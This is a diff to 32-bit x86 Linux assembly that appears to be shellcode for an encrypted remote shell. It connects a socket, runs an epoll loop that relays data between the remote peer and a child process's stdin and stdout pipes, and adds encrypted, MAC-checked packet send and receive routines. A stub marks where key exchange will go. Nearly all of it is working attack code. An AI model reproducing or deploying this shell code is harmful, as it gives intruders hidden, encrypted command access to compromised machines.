@@ -237,12 +237,15 @@ opn_con:
       mov    ecx, esp          ; &args
 epx_con:      
       push   SYS_CONNECT
-      pop    ebx               ; ebx=SYS_CONNECT
+      pop    ebx               ; ebx = SYS_CONNECT
       push   SYS_socketcall
       pop    eax
       int    0x80      
-      ; test   eax, eax
-      ; jle    ??
+
+      ; *****************************************
+      ; perform key exchange
+      ;
+      ; *****************************************
       
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
@@ -289,18 +292,27 @@ poll_wait:
       test   al, EPOLLIN
       jz     cls_sck
       
-      lodsd                   ; eax = evt.data.fd 
-      mov    ebx, [ebp+p_out] ; ebx = out[0]
-      mov    esi, [ebp+s]     ; esi = s
-      
+      lodsd                   ; eax = evt.data.fd       
       ; if (fd == s)
-      cmp    eax, esi
-      jne    do_read
+      cmp    eax, [ebp+s]
+      jne    read_stdout
+read_network:      
+      ; receive data from remote peer
+      call   spp_recv
+      jle    cls_sck
       
-      mov    ebx, esi          ; ebx = s
-      mov    esi, [ebp+p_in+4] ; esi = in[1]
-do_read:      
-      ; len = read(r, buf, BUFSIZ);
+      xchg   eax, edx          ; edx = len 
+
+      ; write to stdin
+      ; write(in[1], buf, len);
+      mov    ebx, [ebp+p_in+4]
+      push   SYS_write
+      pop    eax
+      int    0x80
+      jmp    poll_wait      
+read_stdout:
+      ; len = read(out[0], buf, BUFSIZ);
+      mov    ebx, [ebp+p_out]
       push   SYS_read
       pop    eax
       cdq
@@ -308,12 +320,9 @@ do_read:
       int    0x80      
       xchg   eax, edx          ; edx = len 
       
-      ; write(w, buf, len);
-      mov    ebx, esi          ; ebx = out[0] or s
-      push   SYS_write
-      pop    eax
-      int    0x80
-      jmp    poll_wait
+      ; send to remote peer
+      call   spp_send
+      jg     poll_wait
 cls_sck:      
       ; shutdown(s, SHUT_RDWR);
       mov    eax, SYS_shutdown
@@ -376,33 +385,44 @@ cls_efd:
 ;
 ; send packet, fragmented if required
 ;
+; buflen in edx
+; buf in edi
+; ctx in ebp
 ; ***********************************
 send_pkt:
       pushad
       ; 1. wrap
-      stc
+      xor    ecx, ecx         ; ecx = ENCRYPT
       call   encrypt      
       ; 2. send
-c_send:
+      xor    esi, esi         ; sum = 0
+s_pkt:
+      cmp    esi, edx         ; sum<buflen
+      jae    exit_spkt
+      
       xor    eax, eax
-      push   eax
-      mov    al, BUFSIZ
-      push   eax
-      lea    ecx, [ebp+buf]
-      push   ecx
-      push   dword[ebp+s]
-      mov    ecx, esp      
+      push   eax              ; flags = 0
+      mov    ecx, edx
+      sub    ecx, esi
+      push   ecx              ; len   = buflen - sum
+      lea    ecx, [esi+edi] 
+      push   ecx              ; buf   = &buf[sum]
+      mov    ecx, esp         ; ecx   = &args
+      
       push   SYS_SEND
       pop    ebx
-      push   SYS_socketcall
-      pop    eax      
+      mov    al, SYS_socketcall      
       int    0x80
-      add    esp, 4*4
-      test   eax, eax
-      jle    exit_rpkt
-      add    ebp, eax
-      jmp    r_pkt         
-      jg     c_send      
+      
+      add    esp, 3*4         ; fix-up stack
+      
+      test   eax, eax         ; if (len <= 0) return -1; 
+      jle    exit_spkt
+      
+      add    esi, eax         ; sum += len
+      jmp    s_pkt
+exit_spkt:
+      mov    [esp+_eax], esi  ; return sum    
       popad
       ret
 ; ***********************************
@@ -412,40 +432,62 @@ c_send:
 ; ***********************************      
 spp_send:
       pushad
-      ; 1. send length of data
+      ; 1. send length (including MAC)
+      add    edx, 8     ; add MAC length
       call   send_pkt
-      jle    exit_send      
+      jle    exit_send
+      
       ; 2. send the data
       call   send_pkt      
-exit_send      
+exit_send:
+      mov    [esp+_eax], eax      
       popad
       ret
 ; ***********************************
 ;
 ; receive packet, fragmented if required
 ;
+; buflen in edx
+; buf in edi
+; ctx in ebp
 ; ***********************************
 recv_pkt:
       pushad     
       ; 1. receive
-      mov    ecx, esp      
+      xor    esi, esi         ; sum = 0
 r_pkt:
+      cmp    esi, edx         ; sum<buflen
+      jae    dec_pkt
+      
+      xor    eax, eax
+      push   eax              ; flags = 0
+      mov    ecx, edx
+      sub    ecx, esi
+      push   ecx              ; len   = buflen - sum
+      lea    ecx, [esi+edi] 
+      push   ecx              ; buf   = &buf[sum]
+      mov    ecx, esp         ; ecx   = &args
+      
       push   SYS_RECV
       pop    ebx
-      push   SYS_socketcall
-      pop    eax      
+      mov    al, SYS_socketcall      
       int    0x80
-      add    esp, 4*4
-      test   eax, eax
+      
+      add    esp, 3*4         ; fix-up stack
+      
+      test   eax, eax         ; if (len <= 0) return -1; 
       jle    exit_rpkt
-      add    ebp, eax
+      
+      add    esi, eax         ; sum += len
       jmp    r_pkt
+dec_pkt:      
       ; 2. unwrap
-      clc
+      push   1
+      pop    ecx              ; ecx = DECRYPT
       call   encrypt
       test   eax, eax
 exit_rpkt:      
-      mov    [esp+_eax], eax
+      mov    [esp+_eax], eax  ; return length or -1 on error 
       popad
       ret
 ; ***********************************
@@ -455,32 +497,21 @@ exit_rpkt:
 ; ***********************************      
 spp_recv:
       pushad
-      ; 1. receive the length
+
+      ; 1. receive the length (which includes a MAC)
+      push   4 + 8             ; sizeof(uint32_t) + SPP_MAC_LEN
+      pop    edx
       call   recv_pkt
-      jle    exit_recv      
+      jle    exit_recv
+      
       ; 2. receive the data
+      mov    edx, [edi]        ; edx = buflen      
       call   recv_pkt
-exit_recv:      
+exit_recv:
+      mov    [esp+_eax], eax   ; return length or -1   
       popad
       ret
    
-; ***********************************
-;
-; perform Diffie-Hellman-Merkle key exchange
-;
-; ***********************************    
-key_xchg:
-      pushad
-      xor    ecx, ecx
-      mov    ch, 10h        ; we want 4096 bytes
-      sub    esp, ecx
-      mov    edi, esp
-      call   load_p
-load_p:
-      rep    movsb      
-      popad
-      ret
-      
 %include "mxp.asm"
 %include "rnx.asm"
 %include "cpx.asm"
